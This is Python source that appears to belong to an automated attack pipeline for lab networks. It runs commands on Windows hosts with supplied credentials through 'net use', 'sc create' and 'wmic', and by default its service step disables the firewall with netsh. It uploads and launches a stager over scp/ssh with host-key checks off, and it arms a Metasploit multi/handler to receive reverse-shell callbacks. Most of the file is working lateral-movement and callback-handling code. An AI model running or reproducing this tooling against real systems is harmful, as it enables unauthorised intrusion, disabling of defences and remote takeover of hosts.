            second = deliver(binding, {"tool": "cmd", "name": "cmd", "via": "session",
                                       "content": "echo " + marker},
                             backend=self.backend, transports=self.transports)
            text = (str((first.get("response") or {}).get("stdout") or "") + "\n"
                    + str((second.get("response") or {}).get("stdout") or ""))
            known = (marker in text or "成功" in text or "SUCCESS" in text
                     or "ReturnValue" in text)
            return {"effect_known": known,
                    "response": {"stdout": text, "return_code": 0 if known else 1,
                                 "transport_error": False, "timed_out": not known}}
        if method == "sc":
            # The writeup's own three steps (6.2.1-6.2.2), unchanged:
            #   net use \\dc\ipc$ ...   -> sc create unablefirewall binpath= "netsh ..."
            #   -> sc start unablefirewall
            # `sc start` answering 1053 is expected for a non-service binary and means the
            # command ran. There is no read-back here: the writeup proves the state with the
            # next step (psexec into the DC), and so does this run.
            from secrets import token_hex
            service = "unablefirewall"
            marker = "agv-sc-" + token_hex(6)
            binary = "netsh advfirewall set allprofiles state off"
            if str(command).strip() and "netsh" not in str(command):
                # A caller that names another command keeps it; the default is the writeup's.
                binary = str(command).strip().replace("\n", " & ")
            line = ("net use \\\\" + str(host) + "\\IPC$ /user:" + user + " " + secret
                    + " & sc \\\\" + str(host) + " create " + service
                    + " binpath= \"" + binary + "\" type= own start= demand"
                    + " & sc \\\\" + str(host) + " start " + service
                    + " & echo " + marker)
            from deployment.request_dispatch import deliver
            first = deliver(binding, {"tool": "cmd", "name": "cmd", "via": "session",
                                      "content": line},
                            backend=self.backend, transports=self.transports)
            second = deliver(binding, {"tool": "cmd", "name": "cmd", "via": "session",
                                       "content": "echo " + marker},
                             backend=self.backend, transports=self.transports)
            text = (str((first.get("response") or {}).get("stdout") or "") + "\n"
                    + str((second.get("response") or {}).get("stdout") or ""))
            # `sc start` answers 1053 for a non-service binary even when the command ran, so
            # the marker plus a create/delete receipt is the observable effect.
            known = marker in text and ("[SC]" in text or "1053" in text
                                        or "SUCCESS" in text or "\u6210\u529f" in text)
            return {"effect_known": known,
                    "response": {"stdout": text, "return_code": 0 if known else 1,
                                 "transport_error": False, "timed_out": not known}}
        if method != "wmic":
            raise PipelineFailure("参数没给到", "credential_remote_method_unknown")
        # WMIC parses `process call create <paramlist>`; a command with spaces must be one
        # quoted parameter, otherwise it reads `netsh` as the whole command and reports
        # "Invalid format" (live 2026-10-18, node 2 firewall step).
        line = ("wmic /node:" + str(host) + " /user:" + user + " /password:" + secret
                + " process call create \"" + str(command).replace('"', '\\"') + "\"")
        from deployment.request_dispatch import deliver
        return deliver(binding, {"tool": "cmd", "name": "cmd", "via": "session",
                                 "content": line},
                       backend=self.backend, transports=self.transports)

    def deliver(self, entry, payload, *, timeout):
        # One target path per hand-over: a previous stager still running would hold the
        # configured path open and make the upload fail with "Text file busy".
        command = self.options.launch_command.format(
            artifact_url=self.artifact_url_for(payload),
            remote_path=self._handover_remote_path(payload))
        # The migration reserves its own port; an artifact built for another port must be
        # rebuilt here, or the payload calls back to a listener that is no longer armed.
        stager_path = str(self._stager_path(payload))
        if self._artifact_ports.get(stager_path) != int(payload.callback_port):
            self.build_artifact(payload)
        if entry.reference is None or entry.provider is None:
            raise PipelineFailure("参数没给到", "migration_source_reference_missing")
        if entry.provider == "console":
            reference = entry.reference
            from deployment.request_dispatch import deliver_to_reference

            result = deliver_to_reference(reference, command, backend=self.backend,
                                          end_marker=self.options.end_marker,
                                          timeout=self.options.command_timeout)
        elif getattr(entry, "binding", None):
            # The export already froze how this channel is reached; resolve it with the
            # same provider dispatch every stage uses instead of inventing a transport.
            from src.tools.providers.resolve import provider_for
            binding = ExecutionBinding.model_validate(entry.binding)
            provider = provider_for(binding, backend=self.backend, transports=self.transports)
            if entry.provider == "ssh" and hasattr(provider, "launch"):
                # The stager is on the control box; upload it over the frozen SSH key and
                # start it there. Running the scp/ssh command through the target-side
                # provider would try to scp from inside the target.
                command = self._ssh_handover_command(binding, payload)
                delivered = provider.launch(command, end_marker=self.options.end_marker,
                                            timeout=float(timeout))
            else:
                delivered = provider.execute(command, end_marker=self.options.end_marker,
                                             timeout=float(timeout))
            result = {"effect_known": bool(delivered.ok),
                      "response": {"stdout": delivered.output,
                                   "return_code": 0 if delivered.ok else 1,
                                   "transport_error": not delivered.ok,
                                   "timed_out": False,
                                   "provider": provider.name}}
        else:
            # Legacy owner hook retained for deployments that already implement it.
            execute_entry = getattr(self.transports, "execute_entry", None)
            if not callable(execute_entry):
                raise PipelineFailure("参数没给到", "migration_source_provider_unavailable")
            result = execute_entry(entry, command=command, timeout=timeout)
        if not result["effect_known"]:
            raise PipelineFailure("会话没接上", "owner_delivery_unconfirmed")
        return result

    def _ssh_handover_command(self, binding, payload):
        """Upload this migration's stager over the frozen key and launch it."""
        key_path = str(binding.ssh_key_path or "")
        if not key_path:
            raise PipelineFailure("参数没给到", "migration_source_ssh_key_missing")
        address = binding.addresses[0] if binding.addresses else binding.host
        destination = shlex.quote(str(binding.identity) + "@" + str(address))
        options = ("-o IdentitiesOnly=yes -o StrictHostKeyChecking=no "
                   "-o UserKnownHostsFile=/dev/null -o BatchMode=yes")
        port = int(binding.ssh_port or 22)
        stager = self._stager_path(payload)
        remote_path = self._handover_remote_path(payload)
        remote = ("chmod +x " + shlex.quote(remote_path) + " && (setsid "
                  + shlex.quote(remote_path) + " >/dev/null 2>&1 </dev/null &) "
                  + "&& echo agv-payload-started")
        return ("scp -i " + shlex.quote(key_path) + " " + options + " -P " + str(port)
                + " " + shlex.quote(stager) + " " + destination + ":"
                + shlex.quote(remote_path)
                + " && ssh -i " + shlex.quote(key_path) + " " + options + " -p " + str(port)
                + " " + destination + " " + shlex.quote(remote))

    def _handover_remote_path(self, payload) -> str:
        """A per-operation target path for this hand-over.

        The configured path is fixed, so a stager left running by an earlier attempt keeps
        the file open for execution and `scp` refuses the upload with "Text file busy".
        Because the launch is chained with `&&`, nothing then runs and the receiver times out
        (live 2026-10-18, node 12 closeout: the payload on web1 was still the previous
        probe's). Run and operation make the name unique without the card inventing one.
        """
        from hashlib import sha256
        suffix = sha256((str(payload.run_id) + ":" + str(payload.operation_id))
                        .encode()).hexdigest()[:10]
        return str(self.options.remote_path).rstrip("/") + "_" + suffix

    def _receiver_binding(self):
        binding = ExecutionBinding.model_validate(self.options.receiver_binding)
        # The receiver/control box is this run's own kali entry, never a target session.
        if binding.binding_kind != "controller_entry":
            binding = binding.model_copy(update={"binding_kind": "controller_entry"})
        return binding.model_dump(exclude_none=True)

    def _arm_handler(self, payload: CallbackPayload) -> str:
        """Arm the console's payload handler on the reserved callback port.

        The console's text is a display detail: it can be split across reads or arrive a
        moment after the console reports idle. The job the call actually started is the
        fact, so the id is reconciled against the service's own job list. Evidence: run
        node-final-20261017-08/node 28 armed LPORT 42274 as job 2 while the text match
        missed it and the attempt was reported as owner_handler_not_armed.
        """
        spec = self.options.handler or {}
        chosen = self._payload_name(payload)
        module_ref = str(spec.get("module") or "exploit/multi/handler")
        module_type, _, module_name = module_ref.partition("/")
        runner = getattr(self.backend, "run_module", None)
        if callable(runner):
            try:
                job = runner(module_type, module_name,
                             {"PAYLOAD": chosen, "LHOST": "0.0.0.0",
                              "LPORT": str(payload.callback_port),
                              "ExitOnSession": "false"},
                             payload=chosen)
            except Exception:
                job = None
            if job:
                return str(job)
        module = "use " + module_ref
        before = set(self._list_jobs())
        # Enter the module in its own call and observe that it took effect. Sending `use`
        # together with the `set` lines lets a still-loading console drop the first line, and
        # then every option lands in the global datastore and `exploit` answers "Unknown
        # command" (live 2026-10-18, run e2e-04 round 2: no job was created at all).
        entered = _await_module(
            lambda: self.backend.console(
                [module], timeout=min(float(self.options.command_timeout), 10.0),
                await_markers=("Using configured payload", "Failed to load module",
                               "Unknown command", "payload")),
            timeout=float(self.options.command_timeout))
        # Module options live in one global datastore. A previous SMB service run leaves
        # `TARGET` behind (the native-upload/Command targets both set it), and the handler
        # module has no such target index: arming then answers "Invalid target index" and no
        # job is created (live 2026-10-18, node 44 after node 2). Clear the module-specific
        # keys this handler never owns before setting its own.
        # `unset` only clears the module-local copy; the global value is still applied as a
        # preference, which is what made the handler keep target index 2. `unsetg` is the
        # form that actually removes it (verified 2026-10-18).
        lines = ["unsetg TARGET",
                 "unsetg RHOSTS",
                 "set PAYLOAD " + chosen,
                 "set LHOST " + str(spec.get("lhost") or payload.callback_host),
                 "set LPORT " + str(payload.callback_port),
                 "set ExitOnSession false",
                 "exploit -j -z"]
        text = self.backend.console(lines, timeout=self.options.command_timeout)
        jobs = self._list_jobs()
        fresh = [job_id for job_id, name in jobs.items()
                 if job_id not in before and "handler" in str(name).lower()]
        if len(fresh) == 1:
            return fresh[0]
        # Text alone is not proof: the console buffer can still hold a "background job N"
        # line from an earlier attempt, and returning that id points at another port's
        # handler (live 2026-10-18, node 28: owner_handler_not_armed while the new job was
        # armed under a different id). Only a job this call created is accepted here.
        match = re.search(r"background job (\d+)", text)
        if match and match.group(1) in fresh:
            return match.group(1)
        # This attempt may have been answered by a handler that was already armed on the
        # same port with the same payload (a retry, or the card armed it first). Reuse it
        # only when the record proves both the port and the payload match.
        record_of = getattr(self.backend, "job_info", None)
        if record_of is not None:
            for job_id, name in jobs.items():
                if "handler" not in str(name).lower():
                    continue
                try:
                    record = record_of(job_id) or {}
                except Exception:
                    continue
                datastore = record.get("datastore") if isinstance(record, dict) else None
                if not isinstance(datastore, dict):
                    continue
                if (str(datastore.get("LPORT", "")) == str(payload.callback_port)
                        and str(datastore.get("PAYLOAD", "")).strip() == chosen):
                    return job_id
        return ""

    def _list_jobs(self) -> dict:
        """Best-effort job snapshot; reconciliation must not hide the original failure."""
        try:
            return {str(key): str(value)
                    for key, value in (self.backend.list_jobs() or {}).items()}
        except Exception:
            return {}

    def _fetch_values(self, payload):
        chosen = self._payload_name(payload, required=False)
        try:
            stager_path = self._stager_path(payload, chosen)
        except PipelineFailure:
            # Not every template uses the artifact path (for example a receiver stop
            # command names only the port). Leave it empty so fill_template names the
            # actual missing field only when that template needs it.
            stager_path = ""
        return {"port": payload.callback_port, "fetch_port": self.options.fetch_port,
                "callback_host": payload.callback_host,
                "artifact_url": self.artifact_url_for(payload),
                "remote_path": self.options.remote_path,
                "payload": chosen, "format": self._artifact_format(chosen),
                "stager_path": stager_path}

    def run_receiver(self, payload: CallbackPayload):
        """Start this migration's receiver: the console owns the handler, the deployment
        may add a fetch service for targets that pull the artifact themselves."""
        if self.options.handler:
            job = self._arm_handler(payload)
            self._handlers[payload.operation_id] = job
            if not self._handlers[payload.operation_id]:
                raise PipelineFailure("会话没接上", "owner_handler_not_armed")
        if self.options.receiver_command:
            command = self.options.receiver_command.format(**self._fetch_values(payload))
            result = self.transports.execute(self._receiver_binding(), ExecutionRequest(
                tool="code", name="bash", via=self._receiver_binding()["via"], content=command))
            if result.get("effect_known") is not True:
                raise PipelineFailure("参数没给到", "owner_receiver_launch_failed")
            # A fetch service that never binds makes the delivery command a silent
            # no-op, so the receiver must be observed listening before hand-over.
            if self.options.fetch_port and not self.port_is_open(
                    payload.callback_host, int(self.options.fetch_port)):
                raise PipelineFailure("会话没接上", "owner_receiver_not_listening")

    def stop_receiver(self, payload: CallbackPayload):
        """Release the temporary receiver; an accepted session is never stopped here."""
        if self.options.handler:
            job = self._handlers.pop(payload.operation_id, "")
            if not job:
                raise PipelineFailure("会话没接上", "owner_handler_job_unknown")
            self.backend.console(["jobs -k " + job], timeout=self.options.command_timeout)
        if self.options.receiver_command:
            command = self.options.receiver_stop_command.format(**self._fetch_values(payload))
            result = self.transports.execute(self._receiver_binding(), ExecutionRequest(
                tool="code", name="bash", via=self._receiver_binding()["via"], content=command))
            if result.get("effect_known") is not True:
                raise PipelineFailure("会话没接上", "owner_receiver_release_unconfirmed")

    @staticmethod
    def port_is_open(host: str, port: int, timeout: float = 2.0) -> bool:
        try:
            with create_connection((str(host), int(port)), timeout):
                return True
        except OSError:
            return False


def _parameters(description: str) -> dict:
    inside = str(description).split("(", 1)[1].rsplit(")", 1)[0]
    parts = [part.strip() for part in inside.split(",")]
    if len(parts) < 2 or not all(parts[:2]):
        raise PipelineFailure("技能卡写得不好", "owner_exec_fact_unparsable")
    return {"host": parts[0], "user": parts[1]}


#: Legacy name kept for stored evidence and older imports.
ConsoleOwner = ExecutionSessionOwner


class ConsoleReceiver:
    """One reserved receiver: launched once, then observed for both readiness and callback."""

    def __init__(self, owner: ExecutionSessionOwner, payload: CallbackPayload):
        self.owner, self.payload, self.baseline = owner, payload, {}

    def start(self):
        self.baseline = dict(self.owner.backend.list_sessions())
        path = self.owner._migration_path(self.payload.run_id, self.payload.operation_id)
        if path.exists():
            raise ValueError("Migration receiver already has a durable intent")
        _write_json(path, {"payload": self.payload.model_dump(mode="json"),
            "baseline": [[sid, metadata.instance_id] for sid, metadata in self.baseline.items()],
            "receipts": []})
        self.owner.run_receiver(self.payload)

    def wait_ready(self, timeout):
        deadline = monotonic() + timeout
        while True:
            if self.owner.port_is_open(self.payload.callback_host, self.payload.callback_port):
                return True
            remaining = deadline - monotonic()
            if remaining <= 0:
                return False
            sleep(min(self.owner.options.poll_interval, remaining))

    def wait_callback(self, timeout):
        deadline = monotonic() + timeout
        while True:
            receipts = self.owner.lookup_migration(run_id=self.payload.run_id,
                                                  operation_id=self.payload.operation_id)
            if receipts:
                return CallbackReceipt.model_validate(min(receipts, key=lambda r: (
                    r["reference"]["session_id"], r["reference"]["instance_id"], r["reference"]["generation"])))
            remaining = deadline - monotonic()
            if remaining <= 0:
                return None
            sleep(min(self.owner.options.poll_interval, remaining))


@contextmanager
def open_owner(*, transports, options):
    owner = ExecutionSessionOwner(transports=transports, options=options)
    with owner:
        yield owner


open_owner.validate_options = validate_delivery_spec


@contextmanager
def reserve_receiver(*, payload, owner):
    """Exit releases only the temporary receiver; an accepted session stays alive."""
    receiver = ConsoleReceiver(owner, payload)
    try:
        yield receiver
    finally:
        receiver.owner.stop_receiver(payload)
